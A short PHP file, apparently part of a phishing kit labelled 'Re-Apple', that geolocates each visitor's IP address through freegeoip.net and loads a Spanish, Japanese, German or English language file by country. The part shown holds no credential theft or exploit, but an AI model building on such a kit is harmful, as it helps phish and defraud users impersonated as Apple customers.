<?php
//    _____                
//   /  _  \ _________  ___
//  /  /_\  \\____ \  \/  /
// /    |    \  |_> >    < 
// \____|__  /   __/__/\_ \
//         \/|__|        \/
// 			xlymetic 2017
// Re-Apple [Slekekc0de-2k17]
$apxip = $_SERVER['REMOTE_ADDR'];
$details = json_decode(file_get_contents("http://freegeoip.net/json/".$apxip.""));
$negara 		= $details->country_code;
$nama_negara 	= $details->country_name;
$kode_negara 	= strtolower($negara);
$kota        	= $details->city;
$state        	= $details->region_name;

#Spanyol
$apx_es = 	array("Mexico",
		      "Colombia",
		      "Spain",
		      "Argentina",
		      "Peru",
		      "Venezuela",
		      "Chile",
		      "Ecuador",
		      "Guatemala",
		      "Cuba",
		      "Bolivia",
		      "Dominican Republic",
		      "Honduras",
		      "Paraguay",
		      "El Salvador",
		      "Nicaragua",
		      "Costa Rica",
		      "Puerto Rico",
		      "Panama",
		      "Uruguay",
		      "Equatorial Guinea");
#Japan
$apx_jp =	array("Japan",);
#Germany
$apx_de = 	array("Germany",
			  "Austria",
			  "Switzerland",
			  "Liechtenstein");



if (in_array($nama_negara, $apx_es)) {
    require "apx_lang/es.php";
}elseif(in_array($nama_negara, $apx_jp)){
	require "apx_lang/jp.php";
}elseif(in_array($nama_negara, $apx_de)){
	require "apx_lang/de.php";
}else{
	require "apx_lang/en.php";
}

